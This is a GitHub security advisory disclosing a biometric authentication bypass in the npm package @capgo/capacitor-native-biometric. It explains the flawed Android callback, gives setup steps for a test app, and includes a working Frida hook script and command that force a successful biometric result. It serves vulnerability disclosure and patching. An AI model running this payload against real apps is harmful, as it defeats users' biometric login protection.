# [M] cap-go/capacitor-native-biometric Authentication Bypass

## Summary
Severity: Medium
Advisory: GHSA-vx5f-vmr6-32wf
CWE: CWE-287
Ecosystem: npm
CVSS: CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-10
Source: https://github.com/advisories/GHSA-vx5f-vmr6-32wf
Type: github-advisory

## Affected
- npm: `@capgo/capacitor-native-biometric` — affected >=0 <8.3.6

## Details
There is a potential issue with the [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library. 

---

## Summary

The [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library was found to be subject to an authentication bypass as the current implementation of the `onAuthenticationSucceeded()` does not appear to handle a `CryptoObject`[^HackTricks1] [^SecuringBiometricAuthentication] as seen in the following code block starting from [line 88 in AuthActivity.java](https://github.com/Cap-go/capacitor-native-biometric/blob/main/android/src/main/java/ee/forgr/biometric/AuthActivity.java#L88):

```java
@Override
    public void onAuthenticationSucceeded(
        @NonNull BiometricPrompt.AuthenticationResult result
    ) {
        super.onAuthenticationSucceeded(result);
        finishActivity("success");
    }
```

As the current implementation only checks whether `onAuthenticationSucceeded()` was called and does not handle a `CryptoObject` the biometric authentication can be bypassed by hooking the `onAuthenticationSucceeded()` function. 

## PoC Video:

https://github.com/user-attachments/assets/b7b5a2bc-21dc-4373-b371-84b002dae7a7

## Environment:

The following steps were taken to create and deploy a Capacitor application using the `cap-go/capacitor-native-biometric library` for the purpose of verifying this finding. Note at the time of writing the `npx create-react-app` command broke, so I have provided two ways of creating and deploying the testing environment. Apparently React updated to version 19 caused a dependency issue as seen [here](https://github.com/facebook/create-react-app/issues/13715). If it is not fixed by the time you look at this PoC please use the yarn alternatives. 

1. Create a new Capacitor app by opening your terminal and run the following commands to create a new Capacitor app. For the sake of the disclosure I'll be using the name `capgo-poc`: 

```sh
npx create-react-app capgo-poc --template typescript
```

Yarn Alternative:

```sh
npm install --global yarn
yarn create react-app capgo-poc --template typescript
```

2. Install dependencies by navigating into your app's directory and run the following command to install Capacitor's core dependencies:

```sh
cd capgo-poc
npm install @capacitor/core 
npm install @capacitor/cli 
npm install @capacitor/android
npm install @capgo/capacitor-native-biometric
npm install react
```

Yarn Alternative:

```sh
cd capgo-poc
yarn add @capacitor/core 
yarn add @capacitor/cli 
yarn add @capacitor/android
yarn add @capgo/capacitor-native-biometric
yarn add react
```

3. Initialise the project using the name `capgo-poc` and `com.capgo.poc`, and add the android platform by running the following commands:

```sh
npx cap init
npx cap add android
```

4. Configure the android permissions by opening the `android/app/src/main/AndroidManifest.xml` file and add the necessary permissions:

```xml
<uses-permission android:name="android.permission.USE_BIOMETRIC" />
<uses-permission android:name="android.permission.USE_FINGERPRINT" />
```

5. Implement Biometric Authentication, here is some basic code to use the biometric authentication feature. Modify the TSX file called `App.tsx` in `src/` and import the following code:

```js
import React, { useState } from 'react';
import { NativeBiometric } from '@capgo/capacitor-native-biometric';

const App = () => {
  // State to hold authentication status
  const [authStatus, setAuthStatus] = useState<string | null>(null);

  // Function to authenticate the user
  const authenticateUser = async () => {
    try {
      const result = await NativeBiometric.verifyIdentity({
        reason: 'For an application access',
        title: 'Log in',
        subtitle: '',
        description: 'Verify yourself by biometrics',
        useFallback: true,
        maxAttempts: 3,
      }).then(() => true)
        .catch(() => false);

      if (!result) {
        setAuthStatus('failed');
      } else {
        setAuthStatus('success');
      }
    } catch (error) {
      console.error('Error during biometric verification:', error);
      setAuthStatus('error');
    }
  };

  return (
    <div>
      <h1>CAP-GO Capacitor Native Biometric Authentication</h1>
      <button onClick={authenticateUser}>Authenticate with Biometrics</button>

      {/* Conditionally render based on authentication status */}
      {authStatus === 'success' && <h2>CAP-GO Capacitor Native Biometric Authentication Success</h2>}
      {authStatus === 'failed' && <h2>CAP-GO Capacitor Native Biometric Authentication Failed</h2>}
      {authStatus === 'error' && <h2>Error during authentication</h2>}
    </div>
  );
};

export default App;
```

6. Build the React project, synchronise it with the Android platform, and open the native Android project in Android Studio by running the following commands:

```sh
npm run build
npx cap sync android 
npx cap open android
```

Yarn alternative:

```sh
yarn build
npx cap sync android 
npx cap open android
```

## Exploitation:

For the purpose of demonstrating the vulnerability we will be using frida and a rooted emulator from android studio. Frida is a dynamic instrumentation toolkit used as part of pentesting mobile applications [^frida]. 

Note that a rooted emulator is not necessary, but is being used for simplicity to demonstrate the vulnerability. 

1. Copy the below frida script to a JavaScript file and run it to hook the `onAuthenticationSucceeded()` function, abusing the `null CryptoObject`. This can be done by running the following command:

```sh
frida -U -l <PAYLOAD> -n 'capgo-poc'
```

### Payload
```js
Java.perform(function () {
  hookBiometricPrompt();
});

function getBiometricAuthResult(resultObj, cryptoInst) {
    var authenticationResultInst = resultObj.$new(cryptoInst, 0);
    return authenticationResultInst;
};

function getBiometricPromptResult() {
    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
    var cryptoInst = cryptoObj.$new(null);
    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    var authenticationResultInst = getBiometricAuthResult(authenticationResultObj, cryptoInst);
    return authenticationResultInst
};

function hookBiometricPrompt() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    console.log("Hooking BiometricPrompt.authenticate()...");
    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
        var authenticationResultInst = getBiometricPromptResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
    }
};
```

[^SecuringBiometricAuthentication]: https://www.kayssel.com/post/android-8/
[^HackTricks1]: https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android#method-1-bypassing-with-no-crypto-object-usage
[^frida]: https://frida.re/

## References
- https://github.com/Cap-go/capgo/security/advisories/GHSA-vx5f-vmr6-32wf
- https://github.com/Cap-go/capacitor-native-biometric/commit/1254602e942f8216e6258f646f0866d8e69c48a5
- https://github.com/Cap-go/capgo
